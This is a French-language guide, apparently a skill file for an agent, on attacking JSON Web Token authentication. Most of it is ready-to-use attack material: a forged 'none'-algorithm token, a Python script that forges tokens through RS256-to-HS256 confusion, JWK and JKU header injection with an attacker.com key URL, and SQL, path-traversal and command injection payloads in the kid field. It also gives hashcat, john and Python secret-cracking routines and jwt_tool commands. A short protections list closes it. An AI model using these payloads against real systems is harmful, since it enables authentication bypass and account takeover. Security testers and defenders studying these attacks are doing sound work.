---
name: jwt-hacking
description: Guide complet d'attaques JWT — none algorithm, algorithm confusion, JWK injection, KID injection, brute-force secrets, timing attacks, outils et payloads.
category: cybersecurite
tags: [jwt, json-web-token, authentication, jws, jwe, jwk, portswigger, jwt-tool]
---

# Attaques JWT (JSON Web Tokens)

## Sommaire
1. [Structure JWT](#structure-jwt)
2. [Attaque None Algorithm](#attaque-none-algorithm)
3. [Algorithm Confusion (RS256→HS256)](#algorithm-confusion)
4. [JWK Header Injection](#jwk-header-injection)
5. [JKU Header Injection](#jku-header-injection)
6. [KID Injection](#kid-injection)
7. [Brute-Force de Secret Key](#brute-force-de-secret-key)
8. [Timing Attacks](#timing-attacks)
9. [Outils et Commandes](#outils-et-commandes)
10. [Protections](#protections)

## Structure JWT

Un JWT est composé de 3 parties séparées par des points :
```
Base64URL(Header).Base64URL(Payload).Signature
```

Exemple de header :
```json
{"alg":"HS256","typ":"JWT"}
```

Exemple de payload :
```json
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

## Attaque None Algorithm

Le serveur doit vérifier la signature, mais certains acceptent `alg: "none"`.

### Technique de base :
```json
{"alg":"none","typ":"JWT"}
```

Payload modifié + point final. Le JWT devient :
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### Bypass de casse :
`None`, `NONE`, `nOnE`, `NoNe`, `NONE`, `none`

### Avec jwt_tool :
```bash
jwt_tool <JWT> -X a
```

## Algorithm Confusion

Si le serveur utilise RS256 (asymétrique RSA) mais accepte HS256 (symétrique HMAC),
l'attaquant peut signer avec la clé publique comme secret HMAC.

### Étapes :
1. Récupérer la clé publique (souvent exposée à `/jwks.json`, `/.well-known/jwks`, etc.)
2. Modifier le header → `"alg":"HS256"`
3. Signer le JWT avec la clé publique comme secret HMAC

### Script Python :
```python
import hmac, hashlib, base64, json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Récupérer la clé publique
public_key = open("public.pem").read()

header = base64url_encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = base64url_encode(json.dumps({"sub":"admin","role":"admin"}).encode())
message = f"{header}.{payload}"

sig = base64url_encode(hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest())
token = f"{message}.{sig}"
print(token)
```

### Avec jwt_tool :
```bash
jwt_tool <JWT> -X k -pk public.pem
```

## JWK Header Injection

Injecter une clé RSA contrôlée par l'attaquant dans le header `jwk`.

### Header modifié :
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "0vx7agoebGcQSuu...", 
    "e": "AQAB",
    "kid": "exploit-key"
  }
}
```

### Avec Burp JWT Editor :
1. Installer l'extension **JWT Editor** depuis le BApp Store
2. Aller dans l'onglet **JWT Editor Keys**
3. Generate → New RSA Key
4. Intercepter la requête, aller dans **JSON Web Token** tab
5. Attack → **Embedded JWK**
6. Signer avec la clé générée

### Génération manuelle de clé RSA :
```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

## JKU Header Injection

Le paramètre `jku` (JWK Set URL) pointe vers une URL contenant les clés.

### Header modifié :
```json
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
```

### Héberger notre JWK Set :
```json
{
  "keys": [{
    "kty": "RSA",
    "n": "0vx7agoebGcQSuu...",
    "e": "AQAB",
    "kid": "exploit-key"
  }]
}
```

### Protections contournées :
- Whitelist de domaines → tester sous-domaines, path traversal
- Validation partielle → tester `https://victim.com@attacker.com/jwks.json`

## KID Injection

Le paramètre `kid` (Key ID) est utilisé pour sélectionner la clé de vérification.

### SQL Injection dans kid :
```json
{"alg":"HS256","typ":"JWT","kid":"key1' UNION SELECT 'aaa'--"}
```

### Path Traversal dans kid :
```json
{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}
```

### Command Injection dans kid :
```json
{"alg":"HS256","typ":"JWT","kid":"| echo vulnerable"}
```

Avec jwt_tool :
```bash
jwt_tool <JWT> -I -hc kid -hv "../../dev/null"
```

## Brute-Force de Secret Key

### Avec hashcat (mode 16500 = JWT HMAC-SHA256) :
```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --show
```

### Avec jwt_tool :
```bash
jwt_tool <JWT> -C -d wordlist.txt
```

### Avec Python :
```python
import hmac, hashlib, base64

def crack_jwt(jwt, wordlist_path):
    header, payload, sig = jwt.rsplit('.', 1)
    message = f"{header}.{payload}"
    with open(wordlist_path) as f:
        for line in f:
            key = line.strip()
            test = base64.urlsafe_b64encode(
                hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
            if test == sig:
                return key
    return None
```

### Wordlists recommandées :
- `rockyou.txt` (standard)
- `jwt-secrets.txt` (secrets JWT connus)
- Générer avec `cewl` sur le site cible

## Timing Attacks

Mesurer la latence du serveur JWT pour détecter :
- Signature valide vs invalide (différence de temps)
- Validation partielle (JWT tronqué)

### Avec Burp Turbo Intruder :
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(target.endpoint,
                          concurrentConnections=5,
                          engine=Engine.BURP2)
    for jwt in wordlists:
        engine.queue(target.req, jwt)
```

## Outils et Commandes

### jwt_tool (recommandé)
```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip install -r requirements.txt

# Analyse
jwt_tool <token>

# None attack
jwt_tool <token> -X a

# Key confusion
jwt_tool <token> -X k -pk public.pem

# JWK injection
jwt_tool <token> -X i

# KID injection
jwt_tool <token> -I -hc kid -hv "../../dev/null"

# Brute-force
jwt_tool <token> -C -d wordlist.txt

# Scan complet
jwt_tool <token> -t -T -I -X a -X k -pk public.pem
```

### Burp Suite + JWT Editor
Extension BApp Store : **JWT Editor** (par PortSwigger)
Fonctionnalités : signature, modification, verification, glitch attacks

### hashcat
```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a?a?a  # brute-force
```

### john
```bash
python3 jwt2john.py <token> > jwt.hash
john jwt.hash --wordlist=rockyou.txt
```

## Protections

- **Ne jamais utiliser `alg: none`** (ou le rejeter strictement)
- **Whitelist d'algorithmes** acceptés (uniquement RS256 ou ES256)
- **Validation de la signature** obligatoire sur TOUS les endpoints
- **Rotation régulière des clés** (key rotation)
- **Utiliser des clés asymétriques** (RS256, ES256) plutôt que symétriques
- **Valider le kid** contre une liste autorisée (pas de path traversal)
- **Ne pas exposer la clé publique** via JWK Set si inutile
- **Utiliser `aud` (audience)** pour lier le token à un client spécifique
- **Expiration courte** (exp) et vérifier le `nbf` (not before)

## Ressources

- **PortSwigger JWT Academy** : https://portswigger.net/web-security/jwt
- **HackTricks JWT** : https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- **PayloadsAllTheThings JWT** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
- **jwt_tool** : https://github.com/ticarpi/jwt_tool
- **jwt.io** : https://jwt.io (debugger)
- **RFC 7515 (JWS)** : https://datatracker.ietf.org/doc/html/rfc7515
- **RFC 7516 (JWE)** : https://datatracker.ietf.org/doc/html/rfc7516